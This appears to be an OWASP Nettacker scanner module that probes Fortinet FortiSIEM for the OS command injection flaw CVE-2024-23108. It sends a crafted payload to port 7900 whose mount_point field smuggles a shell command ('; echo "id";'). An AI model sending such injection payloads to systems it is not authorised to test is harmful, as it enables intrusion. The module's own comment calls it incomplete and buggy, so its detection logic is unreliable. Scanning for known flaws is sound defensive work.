# This is not complete yet , there is a bug , I am still fixing it so you may skip this module for now 
info:
  name: fortinet_forisiem_cve_2024_23108
  author: OWASP Nettacker Team
  severity: 9.1
  description: Fortinet FortiSIEM - OS Command Injection
  reference: 
      - https://www.horizon3.ai/attack-research/disclosures/cve-2024-23108-fortinet-fortisiem-2nd-order-command-injection-deep-dive/
      - https://fortiguard.com/psirt/FG-IR-23-130
      - https://nvd.nist.gov/vuln/detail/CVE-2024-23108
      - https://github.com/horizon3ai/CVE-2024-23108
      - https://github.com/nomi-sec/PoC-in-GitHub
  profiles:
    - vuln
    - http
    - medium_severity
    - cve2024
    - cve
    - fortinet
    - os_command_injection

payloads:
  - library: socket
    steps:
      - method: ssl_probe_for_cve
        timeout: 3
        host: "{target}"
        port:
          - 7900

        payload: |
          \x51\x00\x00\x00\x74\x00\x00\x00\x6f\x42\x1e\x40\x00\x00\x00\x00<TEST_STORAGE type="nfs"><server_ip>127.0.0.1</server_ip><mount_point>/lala; echo "id";</mount_point></TEST_STORAGE>

        response:
          condition_type: or
          conditions:
            regex: "15.."
